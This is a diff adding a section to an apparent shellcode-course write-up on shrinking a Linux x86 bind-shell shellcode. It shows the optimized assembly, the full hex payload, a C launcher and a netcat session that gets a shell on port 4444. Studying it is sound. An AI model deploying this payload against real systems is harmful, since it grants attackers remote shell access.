@@ -618,7 +618,279 @@ exit
 
 ```
 
-The shellcode size is 144, next step is to reduce it!
+The shellcode size is 114, next step is to reduce it!
 
 # Exo 1 - Bind shellcode - Part 3 - Optimized Bind Shellcode
+
+
+In this part optimization is done to reduce the shellcode length. Only successfull tries are reported here.
+
+### Socket call
+
+EBX is set to 0x1 (because of previous *mov bl, 1*), lets see if *push ebx* is shorter than *push 0x1*
+
+```
+8048060:	6a 01                	push   0x1
+8048062:	53                   	push   ebx
+```
+
+### Bind
+
+In the bind part there is a *mov bl, 0x2*. As EBX is already set to 0x1, lets see if inc is shorted:
+
+```
+8048060:	b3 02                	mov    bl,0x2
+8048062:	43                   	inc    ebx
+```
+ 
+Before this section, 0x2 is pushed. As *push bx* is shorter than *pushw 0x2*, we can put the inc ebx at the beginning of this part and *push bx*
+
+```
+8048060:	66 6a 02             	pushw  0x2
+8048063:	66 53                	push   bx
+```
+
+This code
+```ASM
+xor eax, eax
+push eax
+push word 0x5c11	
+push word 0x2
+mov edx, esp
+
+mov al, 0x66
+mov bl, 2 
+push 0x10
+push edx
+push edi
+mov ecx, esp
+
+int 0x80
+```
+
+Became
+```ASM
+xor eax, eax
+push eax
+push word 0x5c11
+inc bl	
+push word bx
+mov edx, esp
+
+mov al, 0x66
+push 0x10
+push edx
+push edi
+mov ecx, esp
+
+int 0x80
+```
+ 
+### Accept
+
+Again, we put 0x5 in bl but bl is already set to 0x4. Inc is shorted
+
+``` 
+8048060:	b3 05                	mov    bl,0x5
+8048062:	43                   	inc    ebx
+```
+
+At the end of the accept part, EAX is put in EBX. Few instructions later EAX is set to 0 because value in EAX cannot be predicted, and then AL is set to 0x3F.
+
+Lets check if we can exchange value (*xchg* instruction) between EAX and EBX. As EBX value is known, EAX will not need to be set to 0 before to put 0x3F in AL
+
+```  
+8048060:	89 c3                	mov    ebx,eax
+8048062:	31 c0                	xor    eax,eax
+8048064:	93                   	xchg   ebx,eax
+```
+
+### Excevec
+
+Because of the loop, ecx is set to -1. Lets check if *inc ecx* is not shorter than *xor ecx,ecx*
+
+```
+8048060:	31 c9                	xor    ecx,ecx
+8048062:	41                   	inc    ecx
+```
+
+Lets check if it is not possible to put the PATH of the executed program on the stack directly in order to reduce the size of the shellcode.
+
+Original code:
+
+```
+00000000 <execve-0x2>:
+   0:	eb 0f                	jmp    11 <callexecve>
+
+00000002 <execve>:
+   2:	b0 0b                	mov    al,0xb
+   4:	5b                   	pop    ebx
+   5:	31 c9                	xor    ecx,ecx
+   7:	31 d2                	xor    edx,edx
+   9:	cd 80                	int    0x80
+   b:	31 c0                	xor    eax,eax
+   d:	b0 01                	mov    al,0x1
+   f:	cd 80                	int    0x80
+
+00000011 <callexecve>:
+  11:	e8 ec ff ff ff       	call   2 <execve>
+  16:	2f                   	das    
+  17:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
+  1a:	2f                   	das    
+  1b:	73 68                	jae    85 <callexecve+0x74>
+```
+
+Lentgth is 28.
+
+Now, lets try to put "/bin/sh" on the stack. As null byte must be avoid, the PATH is padded using "/". Here "/bin/sh" became "//bin/sh"
+
+```
+   0:	b0 0b                	mov    al,0xb
+   2:	31 c9                	xor    ecx,ecx
+   4:	51                   	push   ecx
+   5:	68 6e 2f 73 68       	push   0x68732f6e ; "hs/n"
+   a:	68 2f 2f 62 69       	push   0x69622f2f ; "ib//"
+   f:	89 e3                	mov    ebx,esp
+  11:	31 d2                	xor    edx,edx
+  13:	cd 80                	int    0x80
+```
+
+Length is 21 (with 1 byte for padding). The maximum will be 3 bytes of padding. Using this method redecue the length between 5 and 8 bytes.
+
+### Exit
+
+Last improvement, the exit can be removed:
+
+```
+ 8048060:	31 c0                	xor    eax,eax
+ 8048062:	b0 01                	mov    al,0x1
+ 8048064:	cd 80                	int    0x80
+```
+
+### Optimized shellcode
+
+```ASM
+global _start
+
+section .text
+
+_start:
+	; socketcall
+	xor eax, eax
+	mov al, 0x66
+	xor ebx, ebx
+	mov bl, 1
+
+	xor ecx, ecx
+	push ecx
+	push ebx
+	push 0x2
+	mov ecx, esp
+	int 0x80
+
+	mov edi, eax
+
+	;bind
+	xor eax, eax
+	push eax
+	push word 0x5c11
+	inc bl	
+	push word bx
+	mov edx, esp
+
+	mov al, 0x66
+	push 0x10
+	push edx
+	push edi
+	mov ecx, esp
+
+	int 0x80
+
+	;listen
+	xor eax, eax
+	mov al, 0x66
+	mov bl, 4
+	push eax
+	push edi
+	mov ecx, esp
+	int 0x80
+
+	;accept
+	mov al, 0x66
+	inc ebx
+	xor ecx, ecx
+	push ecx
+	push ecx
+	push edi
+	mov ecx, esp
+	int 0x80
+
+	xchg   ebx,eax
+	
+	;dup2 for loop
+	xor ecx, ecx
+	mov cl, 2
+
+duploop:
+	mov al, 0x3f	
+	int 0x80
+	dec ecx
+	jns duploop	
+
+	;execve
+	mov al, 0xb
+	xor ecx, ecx
+	push ecx,
+	push 0x68732f6e
+	push 0x69622f2f
+	mov ebx, esp
+	xor edx, edx
+	int 0x80
+```
+
+### Compilation
+
+Compilation is done using *nasm*:
+```
+$ nasm -f elf32 -o bind_shellcode_lite.o bind_shellcode_lite.nasm
+$ get-shellcode.sh bind_shellcode_lite.o
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\xfe\xc3\x66\x53\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80"
+```
+
+### Execution
+
+Our C shellcode launcher file is:
+```C
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\xfe\xc3\x66\x53\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80";
+
+main() {
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+```
+
+Compilation and execution in a first terminal:
+```
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+$ ./shellcode 
+Shellcode Length:  100
+```
+
+And access to the bind shell in antoher terminal:
+```
+$ netstat -laput |grep shellcode
+[...]
+tcp        0      0 *:4444                  *:*                     LISTEN      26682/shellcode 
+$ nc 127.0.0.1 4444
+id
+uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+exit
+```
+Shellcode length was reduced of 14 bytes.
+
 # Exo 1 - Bind shellcode - Part 4 - Bind Shellcode Generator
